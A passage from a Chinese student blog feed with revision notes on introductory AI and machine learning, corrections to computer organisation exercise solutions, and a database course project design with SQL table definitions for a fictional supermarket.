src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210044088962_452_20220916221144124086_686_image-20220831220640110.png" width="50%"></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210047629658_923_20220916221145565187_669_image-20220831220659274.png" alt="image-20220831220659274"><figcaption aria-hidden="true">image-20220831220659274</figcaption></figure><p>这个做法是不对的，根据课本上的过程，A*算法会考虑所有可达的评价函数，每次从边缘集合拓展的节点并非总是当前节点的后继节点。fn评价函数是唯一标准如果发现有更小的，会倒回去。</p><p align="center"><img alt="image-20220831220818630" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210048841987_713_20220916221146871853_388_image-20220831220818630.png" width="50%"></p><p>而且贪婪最佳优先搜索也是启发式算法，优先选择启发函数最小的后继节点拓展。</p><p align="center"><img alt="image-20220831222502968" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210052161521_136_20220916221148285550_794_image-20220831222502968.png" width="50%"></p><p align="center"><img alt="image-20220831222848019" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210053407331_533_20220916221149618933_986_image-20220831222848019.png" width="50%"></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210055914678_403_20220916221152879301_392_image-20220831223950629.png" alt="image-20220831223950629"><figcaption aria-hidden="true">image-20220831223950629</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210100629197_676_20220916221155537145_635_image-20220831223959591.png" alt="image-20220831223959591"><figcaption aria-hidden="true">image-20220831223959591</figcaption></figure><p>记住蒙特卡洛树UCB的公式，明白反向传播的过程。 <span class="math display">\[U C B=\bar{X}_j+C \times \sqrt{\frac{2 \ln n}{n_j}}\]</span> <strong>上限置信区间</strong> <strong>(Upper Confidence Bound,UCB)</strong></p><hr><p>监督学习中经验风险和期望风险的概念</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210104619307_128_20220916221157700882_480_image-20220831224734326.png" alt="image-20220831224734326"><figcaption aria-hidden="true">image-20220831224734326</figcaption></figure><p align="center"><img alt="image-20220831224903093" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210105955603_361_20220916221159350035_550_image-20220831224903093.png" width="50%"></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210107235144_810_20220916221201393460_662_image-20220831224941130.png" alt="image-20220831224941130"><figcaption aria-hidden="true">image-20220831224941130</figcaption></figure><p align="center"><img alt="image-20220831224941224" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210107235144_810_20220916221201393460_662_image-20220831224941130.png" width="50%"></p><p>​常用的正则项方法包括L1正则项和L2正则项：其中L1使权重稀疏，L2使权重平滑。一句话总结就是：L1会趋向于产生少量的特征，而其他的特征都是0，而L2会选择更多的特征，这些特征都会接近于0。</p><p>怎么记：1比2小，生成的特征少</p><p align="center"><img alt="image-20220831225522763" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210111062631_540_20220916221204366868_381_image-20220831225522763.png" width="50%"></p><p align="center"><img alt="image-20220831225535198" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210112552099_228_20220916221206081717_192_image-20220831225535198.png" width="50%"></p><p>考法：判断哪些算法是判别模型，哪些是生成模型。大部分典型机器学习算法都是判别模型。贝叶斯方法，隐马科代夫链式生成模型</p><p align="center"><img alt="image-20220831230142515" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210115820984_167_20220916221207951204_832_image-20220831230142515.png" width="50%"></p><p>信息熵小，信息稳定，单一，纯度高；信息熵大，信息不稳定，纯度低。</p><p align="center"><img alt="image-20220831230645025" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210117454363_880_20220916221209692239_698_image-20220831230645025.png" width="50%"></p><p>决策树是在干什么呢？选择最佳属性对样本进行划分，得到最大的“纯度”</p><p>同时注意决策树是有监督学习。</p><p><strong>线性区别分析</strong> <strong>(</strong>linear discriminantanalysis, LDA<strong>)</strong></p><p>线性判别分析的核心：类内方差小，类间间隔大。“君子和而不同，小人同而不和”，是一种降为方法</p><p>#请判断下面说法是否正确：线性判别分析是在最大化类间方差和类内方差的比值(√)</p><p>#在一个监督学习任务中，每个数据样本有4个属性和一个类别标签，每种属性分别有3、2、2和2种可能的取值，类别标签有3种不同的取值。请问可能有多少种不同的样本？（注意，并不是在某个数据集中最多有多少种不同的样本，而是考虑所有可能的样本)()</p><p>乘起来就可以。72</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210118757882_389_20220916221224036219_753_image-20220831232017771.png" alt="image-20220831232017771"><figcaption aria-hidden="true">image-20220831232017771</figcaption></figure><p>记住就可以</p><p>重点：</p><p align="center"><img alt="image-20220831231843333" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210120139847_342_20220916221225672479_673_image-20220831231843333.png" width="50%"></p><p align="center"><img alt="image-20220831232347725" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210123240274_952_20220916221227106679_945_image-20220831232347725.png" width="50%"></p><p align="center"><img alt="image-20220831233241581" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210124487664_976_20220916221229085668_716_image-20220831233241581.png" width="50%"></p><p>ada boosting</p><p><span class="math inline">\(Z_m=\sum_{i=1}^N w_{m, i}\mathrm{e}^{-\alpha_m y G_i\left(x_i\right) \text { 。 }}\)</span>可以把对第 <span class="math inline">\(i\)</span>个训练样本更新后的分布权重写为如下分段函数形式: <span class="math display">\[w_{m+1, i}= \begin{cases}\frac{w_{m, i}}{Z_m} \mathrm{e}^{-\alpha_m},&amp;amp; G_m\left(x_i\right)=y_i \\ \frac{w_{m, i}}{Z_m}\mathrm{e}^{\alpha_m}, &amp;amp; G_m\left(x_i\right) \neq y_i\end{cases}\]</span> 可见, 如果第 <span class="math inline">\(i\)</span>个训练样本无法被第 <span class="math inline">\(m\)</span> 个弱分类器<span class="math inline">\(G_m(x)\)</span> 分类成功,则需要增大该样本权重, 否则减少该样本权重。这样, 被错误分类样本会在训练第 <span class="math inline">\(m+1\)</span> 个弱分类器 <span class="math inline">\(G_{m+1}(x)\)</span> 时被 “重点关注”。</p><p>在第 <span class="math inline">\(m\)</span> 次迭代中, Ada Boosting总是趋向于将具有<font color="Apricot">最小误差的学习模型</font>（err最小的）选做本轮次生成的弱分类器<span class="math inline">\(G_m\)</span>, 促使累积误差快速下降。</p><hr><p>无监督学习</p><p>K-means往往找都是一个局部最优</p><p>聚类迭代满足如下任意一个条件，则聚类停止：</p><p>•已经达到了迭代次数上限</p><p>•前后两次迭代中，聚类质心基本保持不变</p><p align="center"><img alt="image-20220831234829916" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210125709606_805_20220916221230319204_134_image-20220831234829916.png" width="50%"></p><p align="center"><img alt="image-20220831234856133" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210127172626_838_20220916221232576761_180_image-20220831234856133.png" width="50%"></p><p>应当是尽量“不相关”</p><p>•<strong>主成分分析是将𝑛维特征数据映射到𝑙维空间</strong>(<strong>n≫l</strong>)<strong>，去除原始数据之间的冗余性（通过去除相关性手段达到这一目的）。</strong>每一维的样本方差尽可能大</p><p>•<strong>特征人脸方法是一种应用主成份分析来实现人脸图像降维的方法，其本质是用一种称为“特征人脸(eigenface)”的特征向量（而不是像素）按照线性组合形式来表达每一张原始人脸图像，进而实现人脸识别。</strong></p><p>每一个特征人脸的维数与原始人脸图像的维数一样大x 会变小</p><p>特征人脸之间的相关度要尽可能大√</p><p>为了使算法更高效采用了奇异值分解的方法</p><hr><p align="center"><img alt="image-20220901002546496" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210130379164_284_20220916221234267125_288_image-20220901002546496.png" width="50%"></p><p>批量梯度下降算法是在整个训练集上计算损失误差C()。如果数据集较大，则会因内存容量不足而无法完成，同时这一方法收敛速度较慢。随机梯度下降算法是使用训练集中每个训练样本计算所得C()来分别更新参数。虽然，随机梯度下降收敛速度会快一些，但可能出现所优化目标函数震荡不稳定现象。</p><p align="center"><img alt="image-20220901004646914" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210132063072_174_20220916221236054772_109_image-20220901004646914.png" width="50%"></p><p><span class="math display">\[f(x)=\frac{1}{1+\mathrm{e}^{-x}}\]</span> 选取 sigmoid函数作为激活函数, 因为其具有如下优点: (1)概率形式输出, sigmoid函数值域为 <span class="math inline">\((0,1)\)</span>, 因此使 sigmoid函数输出可视为概率值; (2) 单调递增, sigmoid函数对输人 <span class="math inline">\(x\)</span> 取值范围没有限制, 但当 <span class="math inline">\(x\)</span> 大 于一定值后, 函数输出无限趋近于 1 ,而小于一定数值后, 函数输出无限趋近于 0 , 特别地, 当 <span class="math inline">\(x=0\)</span> 时, 函数输出为 <span class="math inline">\(0.5\)</span>; (3) 非线性变化, <span class="math inline">\(x\)</span> 取 值在 0 附近时,函数输出值的变化幅度比较大 (函数值变化陡峭), 意味 着函数在 0附近容易被激活且是非线性变化, 当 <span class="math inline">\(x\)</span>取值很大或很小时, 函数输出值几乎不变, 这是基于概率的一种认识与需要。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210134382419_848_20220916221237401626_567_image-20220901012351440.png" alt="image-20220901012351440"><figcaption aria-hidden="true">image-20220901012351440</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210134382419_848_20220916221237401626_567_image-20220901012351440.png" alt="image-20220901012412558"><figcaption aria-hidden="true">image-20220901012412558</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210137677694_125_20220916221245033698_681_image-20220901012437001.png" alt="image-20220901012437001"><figcaption aria-hidden="true">image-20220901012437001</figcaption></figure><p align="center"><img alt="image-20220901012512732" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210139040872_789_20220916221246660573_722_image-20220901012512732.png" width="50%"></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210140127492_349_20220916221248004240_176_image-20220901012559806.png" alt="image-20220901012559806"><figcaption aria-hidden="true">image-20220901012559806</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210141391762_346_20220916221249466398_422_image-20220901012619080.png" alt="image-20220901012619080"><figcaption aria-hidden="true">image-20220901012619080</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210143541722_397_20220916221251026834_417_image-20220901012639822.png" alt="image-20220901012639822"><figcaption aria-hidden="true">image-20220901012639822</figcaption></figure><hr><p>强化学习的特征</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210144952030_795_20220916221252634813_271_image-20220901082606079.png" alt="image-20220901082606079"><figcaption aria-hidden="true">image-20220901082606079</figcaption></figure><p align="center"><img alt="image-20220901082635583" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210146158871_774_20220916221254174712_770_image-20220901082635583.png" width="50%"></p><p>一个随机过程实际上是一列随时间变化的随机变量。当时间是离散 量时,一个随机过程可以表示为 <span class="math inline">\(\left\{X_t\right\}_{t=0,1,2, \cdots}\)</span>,这里每个 <span class="math inline">\(X_t\)</span> 都是一个随机变量,这被称为离散随机过程。为了方便分析和求解,通常要求通过合理的问题定义使得一个随机过程满足马尔可夫性 (Markovproperty), 即满足如下性质: <span class="math display">\[P\left(X_{t+1}=x_{t+1} \mid X_0=x_0, X_1=x_1, \cdots,X_t=x_t\right)=P\left(X_{t+1}=x_{t+1} \mid X_t=x_t\right) \text {(式7.1) }\]</span> 这个公式的直观解释为: 下一刻的状态 <span class="math inline">\(X_{t+1}\)</span> 只由当前状态 <span class="math inline">\(X_t\)</span> 决定(而与更早的所有状态均无关)。满足马尔可夫性的离散随机过程被称为马尔可夫链 (Markov chain)。</p><p align="center"><img alt="image-20220901083631487" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210147483095_532_20220916221255863567_937_image-20220901083631487.png" width="50%"></p><ul><li>动作 <span class="math inline">\(-\)</span> 价值函数 (action-valuefunction): <span class="math inline">\(q: S \times A \mapsto\mathbb{R}\)</span>, 其中 <span class="math inline">\(q_\pi(s,a)=\mathbb{E}_\pi\left[G_t \mid S_t=s, A_t=a\right]\)</span>,表示智能体在时刻 <span class="math inline">\(t\)</span> 处于状态 <span class="math inline">\(s\)</span> 时, 选择 了动作 <span class="math inline">\(a\)</span> 后，在 <span class="math inline">\(t\)</span> 时刻后根据策略 <span class="math inline">\(\pi\)</span> 采取行动所获得回报的期望。价值函数和动作 <span class="math inline">\(-\)</span>价值函数反映了智能体在某一策略下所对应状态 序列获得回报的期望,它比回报本身更加准确地刻画了智能体的目标。 注意, 价值函数和动作 <span class="math inline">\(-\)</span> 价值函数的定义之所以能够成立,离不开决策 过程所具有的马尔可夫性, 即当位于当前状态 <span class="math inline">\(s\)</span> 时, 无论当前时刻 <span class="math inline">\(t\)</span> 的取值是多少,一个策略回报值的期望是一定的 (当前状态只与前一状态有关，与时间无关）。（所以不是<span class="math inline">\(q_\pi(s,a,t)\)</span>） 至此, 强化学习可以转化为一个策略学习问题, 其定义为:给定一 个马尔可夫决策过程 <span class="math inline">\(M D P=(S, A, P, R,\gamma)\)</span>, 学习一个最优策略 <span class="math inline">\(\pi^*\)</span>, 对任 意 <span class="math inline">\(s \in S\)</span> 使得 <span class="math inline">\(V_{\pi^*}(s)\)</span> 值最大。</li></ul><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210148664772_929_20220916221257340897_656_image-20220901083736614.png" alt="image-20220901083736614"><figcaption aria-hidden="true">image-20220901083736614</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210149824175_670_20220916221258558310_351_image-20220901083803818.png" alt="image-20220901083803818"><figcaption aria-hidden="true">image-20220901083803818</figcaption></figure><hr><p align="center"><img alt="image-20220901090535698" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210151522208_726_20220916221300893504_791_image-20220901090535698.png" width="50%"></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210153123121_732_20220916221302843487_985_image-20220901090816141.png" alt="image-20220901090816141"><figcaption aria-hidden="true">image-20220901090816141</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>机器学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机组成原理习题讲解部分勘误</title>
    <link href="/posts/23086/"/>
    <url>/posts/23086/</url>
    
    <content type="html"><![CDATA[<p>4.12</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E4%B9%A0%E9%A2%98%E8%AE%B2%E8%A7%A3%E9%83%A8%E5%88%86%E5%8B%98%E8%AF%AF/20230828210843270855_989_20221013150014727108_816_image-20220822231146713.png" alt="image-20220822231146713"><figcaption aria-hidden="true">image-20220822231146713</figcaption></figure><p>流水线周期取决于耗时最长的阶段。此处忘记了IF的时钟周期仍为150ps。</p><p>5.6</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E4%B9%A0%E9%A2%98%E8%AE%B2%E8%A7%A3%E9%83%A8%E5%88%86%E5%8B%98%E8%AF%AF/20230828210844556701_290_20221013150016592317_276_image-20220821230253484.png" alt="image-20220821230253484"><figcaption aria-hidden="true">image-20220821230253484</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E4%B9%A0%E9%A2%98%E8%AE%B2%E8%A7%A3%E9%83%A8%E5%88%86%E5%8B%98%E8%AF%AF/20230828210846005959_170_20221013150018066044_526_image-20220821230543233.png" alt="image-20220821230543233"><figcaption aria-hidden="true">image-20220821230543233</figcaption></figure><p>第三问的讲解如上图所示。此处p1和p2的CPI计算有误。原因是未考虑指令缺失造成的代价。<span class="math display">\[CPI=1+平均每条指令阻塞始终周期数\\=1+指令缺失阻塞时钟周期数+数据缺失阻塞时钟周期数\]</span></p><p><span class="math display">\[指令缺失阻塞时钟周期数=\texttt{cache}缺失率*指令缺失代价\\指令缺失代价=\frac{访存时间}{\texttt{cache}命中时间}\]</span></p><p><span class="math display">\[数据缺失阻塞时钟周期数=\texttt{cache}缺失率*访存指令占比*数据缺失代价\\指令缺失代价=\frac{访存时间}{\texttt{cache}命中时间}\]</span></p><p>得到两个CPI分别约为12.54和7.35</p><p>5.12</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E4%B9%A0%E9%A2%98%E8%AE%B2%E8%A7%A3%E9%83%A8%E5%88%86%E5%8B%98%E8%AF%AF/20230828210848319381_189_20221013150019552299_178_image-20220822230445847.png" alt="image-20220822230445847"><figcaption aria-hidden="true">image-20220822230445847</figcaption></figure><p>第三小问关于反置页表。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E4%B9%A0%E9%A2%98%E8%AE%B2%E8%A7%A3%E9%83%A8%E5%88%86%E5%8B%98%E8%AF%AF/20230828210849511576_828_20221013150020954753_868_image-20220822231114457.png" alt="image-20220822231114457"><figcaption aria-hidden="true">image-20220822231114457</figcaption></figure><p>在反置页表中是为每一个物理块设置一个页表项的，视频中也有所阐述,但在计算时依旧是使用的虚拟地址。此处应为$$ PTE= \</p><span class="math display">\[\begin{aligned}&amp;=\frac{\text { Size of physical memory }}{\text { Page size }}\\&amp;=\frac{16 \mathrm{GiB}}{4 \mathrm{KiB}} \\&amp;=\frac{2^{34}}{2^{12}} \\&amp;=2^{22}\end{aligned}\]</span><p>$$</p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计组</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数据库系统期末工程作业设计</title>
    <link href="/posts/30344/"/>
    <url>/posts/30344/</url>
    
    <content type="html"><![CDATA[<h3 id="期末工程作业">期末工程作业</h3><p class="note note-info">本文暂只提供相关设计思路，不提供最终实现代码。实现方面前端flask或swing上手较为快速，也可尝试其他框架。后端使用mysql数据库，关于连接数据库方式网上很容易搜到，不再赘述。</p><h4 id="需求描述">1. 需求描述</h4><p>疫情期间，学校的润美超市（虚构）需要对商品物资做更详细的管理。为防止供应链出现问题，对商品的供货商需要进行详细的记录，并对顾客的购买记录进行管理。当然，也需要对商品本身和超市内工作人员进行常规的管理。作为典型的数据库应用场景，引入合适的数据管理系统能够更好的落实疫情防控要求，并让超市具有更好的营业效果。</p><p>1.商品根据名称和供应商整理，通过编号标识，记录其价格。同时对于食品还需记录其保质期，以免过期未处理。</p><p>2.进货数据需要包含商品编号、进货价，进货时间等。</p><p>3.超市内有若干工作人员，需要对其个人信息和销售商品所得薪水进行储存。</p><p>4.需要对顾客信息进行储存。并对应购买时间和商品，形成销售日志。</p><h4 id="概念模型er图">2.1 概念模型ER图</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%B7%A5%E7%A8%8B%E4%BD%9C%E4%B8%9A%E8%AE%BE%E8%AE%A1/20230828211224660894_271_20220919004325018293_610_image-20220919004148336.png" alt="image-20220919004148336"><figcaption aria-hidden="true">image-20220919004148336</figcaption></figure><h4 id="关系模式转换">2.2 关系模式转换</h4><p>注：1.普通商品采用使用空值的方式，food与goods共用一张表</p><p>​ 2.斜体代表外键</p><p>goods（<u>goods_id</u>, goods_name, supplier_id, price, good_num,<em>shelf_no</em>)</p><p>//food（<u>goods_id</u>, goods_name, supplier_id, price,shelf_life)</p><p>supplier（<u>sp_id</u>, sp_name, phone, address)</p><p>supply（<u><em>sp_id</em></u>, <u><em>goods_id</em></u>, enter_time,costs)</p><p>employee（<u>emp_no</u>, <u>emp_name</u>, salary)</p><p>customer（<u>cu_id</u>, cu_name)</p><p>buy(<u><em>cu_id</em></u>, <u><em>goods_id</em></u>, buy_time,buy_costs)</p><p>shelf(<u>shelf_id</u>, goods_num_on_shelf)</p><p>sell (<u><em>emp_no</em></u>, <em><u>goods_id</u></em>)</p><h4 id="sql创建关系模式">2.3 SQL创建关系模式</h4><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-dq7c9slluwpkzv"></i><span>sql</span><div class="collapse show" id="collapse-dq7c9slluwpkzv"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> goods (   goods_id             <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   shelf_id             <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   goods_name           <span class="hljs-type">varchar</span>(<span class="hljs-number">10</span>)                    <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   price                <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   goods_num            <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   shell_life           <span class="hljs-type">timestamp</span>                      <span class="hljs-keyword">null</span>,   <span class="hljs-keyword">constraint</span> PK_GOODS <span class="hljs-keyword">primary</span> key (goods_id));<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> goods   <span class="hljs-keyword">add</span> <span class="hljs-keyword">constraint</span> FK_GOODS_ON_SHELF <span class="hljs-keyword">foreign</span> key (shelf_id)      <span class="hljs-keyword">references</span> shelf (shelf_id)      <span class="hljs-keyword">on</span> <span class="hljs-keyword">update</span> restrict      <span class="hljs-keyword">on</span> <span class="hljs-keyword">delete</span> restrict;<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> supplier (   sp_id                <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   sp_name              <span class="hljs-type">varchar</span>(<span class="hljs-number">10</span>)                    <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   address              <span class="hljs-type">varchar</span>(<span class="hljs-number">10</span>)                    <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   phone                <span class="hljs-type">char</span>(<span class="hljs-number">11</span>)                       <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   <span class="hljs-keyword">constraint</span> PK_SUPPLIER <span class="hljs-keyword">primary</span> key (sp_id));<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> supply (   goods_id             <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   sp_id                <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   enter_time           <span class="hljs-type">timestamp</span>                      <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   costs                <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   <span class="hljs-keyword">constraint</span> PK_SUPPLY <span class="hljs-keyword">primary</span> key clustered (goods_id, sp_id));<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> customer (   cu_id                <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   cu_name              <span class="hljs-type">varchar</span>(<span class="hljs-number">4</span>)                     <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   <span class="hljs-keyword">constraint</span> PK_CUSTOMER <span class="hljs-keyword">primary</span> key (cu_id));<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> shelf (   shelf_id             <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   goods_num_on_shelf   <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   <span class="hljs-keyword">constraint</span> PK_SHELF <span class="hljs-keyword">primary</span> key (shelf_id));<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> employee (   emp_name             <span class="hljs-type">varchar</span>(<span class="hljs-number">4</span>)                     <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   emp_no               <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   salary               <span class="hljs-type">integer</span>                        <span class="hljs-keyword">null</span>,   <span class="hljs-keyword">constraint</span> PK_EMPLOYEE <span class="hljs-keyword">primary</span> key (emp_no));<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> buy (   cu_id                <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   goods_id             <span class="hljs-type">integer</span>                   